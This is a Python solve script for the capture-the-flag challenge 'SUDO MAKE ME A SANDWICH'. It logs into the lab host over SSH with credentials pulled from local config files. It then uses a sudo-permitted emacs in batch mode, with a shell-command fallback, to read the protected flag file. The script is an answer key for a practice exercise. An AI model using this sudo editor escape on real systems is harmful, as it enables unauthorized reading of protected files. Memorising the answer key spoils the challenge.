#!/usr/bin/env python3
"""
Solve script for SUDO MAKE ME A SANDWICH (#735)
Category: General Skills
"""
import os
import re
import sys
import json
from pathlib import Path
import paramiko

def parse_connection_cfg(cfg_path: Path):
    host = ""
    port = 0
    url = ""
    if cfg_path.exists():
        with open(cfg_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("HOST="):
                    host = line.split("=", 1)[1].strip()
                elif line.startswith("PORT="):
                    val = line.split("=", 1)[1].strip()
                    if val.isdigit():
                        port = int(val)
                elif line.startswith("URL="):
                    url = line.split("=", 1)[1].strip()
    return host, port, url

def get_connection_info():
    current_dir = Path(__file__).resolve().parent
    cfg_path = current_dir / "connection.cfg"
    host, port, url = parse_connection_cfg(cfg_path)
    
    username = "ctf-player"
    password = ""

    # Check info.json if info is incomplete
    info_path = current_dir / "info.json"
    if info_path.exists():
        with open(info_path, "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
                desc = data.get("description", "")
                
                # Match ssh command: ssh -p <port> <user>@<host>
                ssh_match = re.search(r"ssh\s+-p\s+(\d+)\s+([^@\s]+)@([^\s`]+)", desc)
                if ssh_match:
                    p, u, h = ssh_match.groups()
                    if not port or port == 0:
                        port = int(p)
                    if not host:
                        host = h
                    username = u
                
                pass_match = re.search(r"(?:using password|credential token)\s+`?([a-zA-Z0-9_-]+)`?", desc)
                if pass_match:
                    password = pass_match.group(1)
            except Exception as e:
                print(f"[-] Error reading info.json: {e}", flush=True)

    if url and not password:
        # Check if password in url e.g. ssh://user:pass@host:port
        url_match = re.search(r"://([^:]+):([^@]+)@", url)
        if url_match:
            username = url_match.group(1)
            password = url_match.group(2)

    return host, port, username, password

def solve():
    print("[*] Solving SUDO MAKE ME A SANDWICH...", flush=True)
    host, port, username, password = get_connection_info()
    print(f"[*] Target: {username}@{host}:{port} with password: {password}", flush=True)
    
    if not host or not port:
        raise ValueError("Could not determine host or port from connection.cfg / info.json")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port=port, username=username, password=password, timeout=15)
    print("[+] SSH connection established.", flush=True)

    # Command to read flag using sudo emacs batch mode
    cmd = 'sudo /bin/emacs -Q --batch --eval \'(princ (with-temp-buffer (insert-file-contents "flag.txt") (buffer-string)))\''
    print(f"[*] Executing command: {cmd}", flush=True)
    stdin, stdout, stderr = ssh.exec_command(cmd)
    
    out = stdout.read().decode(errors="ignore")
    err = stderr.read().decode(errors="ignore")
    print(f"[+] Output:\n{out}", flush=True)
    if err.strip():
        print(f"[!] Stderr:\n{err}", flush=True)

    if not out.strip():
        # Fallback to shell-command in emacs
        cmd2 = 'sudo /bin/emacs -Q --batch --eval \'(shell-command "cat /home/ctf-player/flag.txt")\''
        print(f"[*] Trying fallback: {cmd2}", flush=True)
        stdin, stdout, stderr = ssh.exec_command(cmd2)
        out = stdout.read().decode(errors="ignore") + stderr.read().decode(errors="ignore")
        print(f"[+] Fallback Output:\n{out}", flush=True)

    ssh.close()

    # Search for flag pattern
    flag_match = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", out)
    if not flag_match:
        # Check for any flag-like string
        flag_match = re.search(r"([A-Za-z0-9_-]*\{[^}]+\})", out)

    if flag_match:
        flag = flag_match.group(1)
        for bad in ['decoy', 'fake', 'honeypot', 'dummy']:
            if bad in flag.lower():
                raise ValueError(f"Flag is a decoy: {flag}")

        current_dir = Path(__file__).resolve().parent
        flag_path = current_dir / "flag.txt"
        with open(flag_path, "w", encoding="utf-8") as f:
            f.write(flag + "\n")
        print(f"[+] FLAG: {flag}", flush=True)
        return flag
    else:
        raise RuntimeError(f"Flag not found in output: {out}")

if __name__ == "__main__":
    solve()
